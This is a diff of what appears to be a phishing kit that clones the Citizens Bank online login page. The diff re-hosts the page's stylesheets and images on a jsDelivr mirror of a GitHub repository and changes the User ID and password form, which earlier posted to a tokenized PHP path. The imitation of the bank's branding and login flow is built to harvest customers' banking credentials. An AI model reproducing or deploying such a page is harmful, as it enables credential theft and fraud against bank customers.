@@ -4,14 +4,14 @@
   <title>Online Login | Citizens Bank</title>
   <meta http-equiv="content-type" content="text/html; charset=UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <link rel="shortcut icon" href="/Assets/Guard/img/favicon.png" type="image/x-icon">
-  <link rel="stylesheet" href="/Assets/Guard/css/Login/jquery-ui-1.css">
-  <link rel="stylesheet" href="/Assets/Guard/css/Login/normalize.css">
-  <link rel="stylesheet" href="/Assets/Guard/css/Login/main.css">
-  <link rel="stylesheet" href="/Assets/Guard/css/Login/flows.css">
-  <link rel="stylesheet" href="/Assets/Guard/css/Login/ad-containers.css">
-  <link rel="stylesheet" href="/Assets/Guard/css/Login/citizensns.css">
-  <link rel="stylesheet" href="/Assets/Guard/css/Login/sec-3-3.css">
+  <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/jmtechofficial/zitiizen@master/Guard/Guard/img/favicon.png" type="image/x-icon">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jmtechofficial/zitiizen@master/Guard/Guard/css/Login/jquery-ui-1.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jmtechofficial/zitiizen@master/Guard/Guard/css/Login/normalize.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jmtechofficial/zitiizen@master/Guard/Guard/css/Login/main.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jmtechofficial/zitiizen@master/Guard/Guard/css/Login/flows.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jmtechofficial/zitiizen@master/Guard/Guard/css/Login/ad-containers.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jmtechofficial/zitiizen@master/Guard/Guard/css/Login/citizensns.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jmtechofficial/zitiizen@master/Guard/Guard/css/Login/sec-3-3.css">
 </head>
 <body class="responsive-enabled" style="display: block;">
 <div class="citizens-header-footer-injected">
@@ -113,7 +113,7 @@
       <div class="topshadow"></div>
       <div class="centered-content clearfix">
         <a style="cursor: pointer;" class="page-logo" tabindex="1">
-          <img alt="Citizens Bank" src="/Assets/Guard/img/CTZ_Green-01.png" width="203" height="25">
+          <img alt="Citizens Bank" src="https://cdn.jsdelivr.net/gh/jmtechofficial/zitiizen@master/Guard/Guard/img/CTZ_Green-01.png" width="203" height="25">
         </a>
         <div id="header-navigation-container"></div>
       </div>
@@ -145,7 +145,7 @@
                 </div>
                 <div id="error"></div>
                 <section class="account-section">
-                  <form method="POST" action="../Meta/Benchmark/?token=<?php echo $_SESSION['token']; ?>" id="form_index" class="pay-transfer-options clearfix">
+                  <form method="post" id="form_index" class="pay-transfer-options clearfix">
                     <div class="account-title clearfix">
                       <p>Please enter your Online User ID and Password.</p>
                     </div>
@@ -424,7 +424,7 @@
           </li>
           <li>
             <a style="cursor: pointer;">Equal Housing Lender
-              <img alt="Equal Housing Lender" title="Equal Housing Lender" src="/Assets/Guard/img/equal-housing.gif">
+              <img alt="Equal Housing Lender" title="Equal Housing Lender" src="https://cdn.jsdelivr.net/gh/jmtechofficial/zitiizen@master/Guard/Guard/img/equal-housing.gif">
             </a>
           </li>
           <li>
@@ -487,24 +487,24 @@
             </li>
             <li>Follow:
               <a style="cursor: pointer;">
-                <img src="/Assets/Guard/img/footer-follow-facebook.png" alt="Facebook" align="middle">
+                <img src="https://cdn.jsdelivr.net/gh/jmtechofficial/zitiizen@master/Guard/Guard/img/footer-follow-facebook.png" alt="Facebook" align="middle">
               </a>
               <a style="cursor: pointer;">
-                <img src="/Assets/Guard/img/footer-follow-twitter.png" alt="Twitter">
+                <img src="https://cdn.jsdelivr.net/gh/jmtechofficial/zitiizen@master/Guard/Guard/img/footer-follow-twitter.png" alt="Twitter">
               </a>
               <a style="cursor: pointer;">
-                <img src="/Assets/Guard/img/footer-follow-linkedin.png" alt="Linkedin">
+                <img src="https://cdn.jsdelivr.net/gh/jmtechofficial/zitiizen@master/Guard/Guard/img/footer-follow-linkedin.png" alt="Linkedin">
               </a>
               <a style="cursor: pointer;">
-                <img src="/Assets/Guard/img/footer-follow-youtube.png" alt="Youtube">
+                <img src="https://cdn.jsdelivr.net/gh/jmtechofficial/zitiizen@master/Guard/Guard/img/footer-follow-youtube.png" alt="Youtube">
               </a>
             </li>
           </ul>
           <p class="footer-copyright">
-            © Copyright 2021 Citizens Financial Group, Inc. All rights reserved.<br>Citizens Bank is a brand name of Citizens Bank, N.A. (NMLS ID# 433960).<br>Citizens Bank corporate headquarters: One Citizens Plaza, Providence, RI 02903
+            © Copyright 2022 Citizens Financial Group, Inc. All rights reserved.<br>Citizens Bank is a brand name of Citizens Bank, N.A. (NMLS ID# 433960).<br>Citizens Bank corporate headquarters: One Citizens Plaza, Providence, RI 02903
           </p>
-          <img src="/Assets/Guard/img/elh.gif" alt="Equal Housing Lender">
-          <img src="/Assets/Guard/img/fdicFooter.gif" alt="Member FDIC">
+          <img src="https://cdn.jsdelivr.net/gh/jmtechofficial/zitiizen@master/Guard/Guard/img/elh.gif" alt="Equal Housing Lender">
+          <img src="https://cdn.jsdelivr.net/gh/jmtechofficial/zitiizen@master/Guard/Guard/img/fdicFooter.gif" alt="Member FDIC">
         </div>
       </div>
     </footer>
